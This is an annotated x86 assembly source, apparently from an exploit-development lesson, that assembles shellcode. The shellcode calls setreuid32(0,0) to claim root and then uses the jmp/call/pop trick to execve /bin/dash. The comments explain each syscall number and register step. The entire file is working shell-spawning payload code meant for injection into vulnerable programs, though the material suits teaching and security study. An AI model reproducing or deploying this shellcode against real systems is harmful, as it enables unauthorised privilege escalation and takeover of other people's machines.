;Develop shellcode to execute a hardcoded command to spawn a shell

[SECTION .text]
BITS 32

    int3                        ; breakpoint

                                ; The syscall number for "sys_setreuid32" can be found in:
                                ;     For 32-bit: /usr/include/i386-linux-gnu/asm/unistd_32.h
                                ;     For 64-bit: /usr/include/i386-linux-gnu/asm/unistd_64.h
                                ;     Note: You also can find the syscall list here: "man 2 syscalls"
                                ;
                                ; To check the parameters for setreuid32(), do: man 2 setreuid32
                                ;
                                ; For our code setreuid32(0, 0):
                                ;     EAX <= 203 (0xcb - __NR_setreuid32)
                                ;     EBX <= 0 (Real User ID)
                                ;     ECX <= 0 (Effective User ID)
                                ;
    xor eax, eax                ; zero out EAX
    mov al, 0xcb                ; move 0xCB into EAX for syscall setreuid (203)
    xor ebx, ebx                ; zero out EBX (Set real UID to be zero = root)
    xor ecx, ecx                ; zero out ECX (Set effective UID to be zero = root)
    int 0x80                    ; setreuid (syscall 203 = 0xcb)

                                ; The syscall number for "sys_execve" can be found in:
                                ;     For 32-bit: /usr/include/i386-linux-gnu/asm/unistd_32.h
                                ;     For 64-bit: /usr/include/i386-linux-gnu/asm/unistd_64.h
                                ;     Note: You also can find the syscall list here: "man 2 syscalls"
                                ;
                                ; To check the parameters for execve(), do: man 2 execve
                                ;
                                ; For our code execve(&PathToProgram, &CommandLineArguments[], &EnvVars[]):
                                ;     EAX <= 11 (__NR_execve)
                                ;     EBX <= &PathToProgram (Pathname to the program)
                                ;     ECX <= &CommandLineArguments[] (Command line arguments)
                                ;     EDX <= &EnvVars[] (Environment vars)
                                ;
    jmp short get_command       ; use jmp/call/pop technique to get command string into EBX
                                ; 
                                ; Part 1: Manipulate string to be null terminated
get_command_return:
    pop ebx                     ; pop the address of the command string into EBX
    xor eax, eax
    mov [ebx+9], al             ; put a NULL where the N is in the command string
                                ;
                                ; Part 2: Prepare arguments
    lea esi, [ebx+5]            ; compute the 'dash' string's address
    mov [ebx+10], esi           ; put 'dash' string's address into AAAA (first position of vars' array)
    mov [ebx+14], eax           ; put 4 null bytes into where the BBBB (second position of vars' array AND first position of env vars' array - since we will not use env)
                                ;
                                ; Part 3: Prepare to rock! ;)
    mov al, 11                  ; move 11 into EAX for syscall execve (11)
    lea ecx, [ebx+10]           ; load effective address for the array of arguments ('AAAA' poiting to 'dash' + 'BBBB' being a NULL pointer) into ECX
    lea edx, [ebx+14]           ; load effective address of the nulls (environment var array into EDX)
    int 0x80                    ; execve (syscall 11) to run our command

get_command:
    call get_command_return
    db '/bin/dashNAAAABBBB'     ; our command string followed by:
                                ; N    - placeholder for null
                                ; AAAA - placeholder for pointer to argument's array (of pointers)
                                ; BBBB - placeholder for pointer to environment's array (of pointers) - in this case null

